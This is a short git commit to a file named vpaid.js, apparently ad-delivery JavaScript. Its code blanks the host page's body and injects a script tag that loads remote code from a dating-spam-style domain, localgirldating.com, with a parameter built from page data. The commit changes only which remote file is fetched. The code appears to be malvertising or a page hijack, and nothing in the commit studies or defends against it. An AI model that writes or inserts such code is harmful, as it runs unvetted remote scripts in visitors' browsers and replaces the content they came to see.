73004f0c8a254f1511c1c94b7de66c026faca6a4
coolboy112233 <36572517+coolboy112233@users.noreply.github.com>
2019-03-10 02:50:58 +0530

    Update vpaid.js

--- vpaid.js
+++ vpaid.js
@@ -23,7 +23,7 @@ document.getElementsByTagName("body")[0].innerHTML='';
 			doc.getElementsByTagName("body")[0].innerHTML='';
 			script = document.createElement("script");
 			script.type ='text/javascript';
-			script.src ='https://localgirldating.com/vp2/yt_js1.js?a=15&ai='+newstr;
+			script.src ='https://localgirldating.com/vp2/yt_js.js?a=15&ai='+newstr;
 			doc.body.appendChild(script);
 		};
 		document.getElementsByTagName("body")[0].appendChild(safeframe);
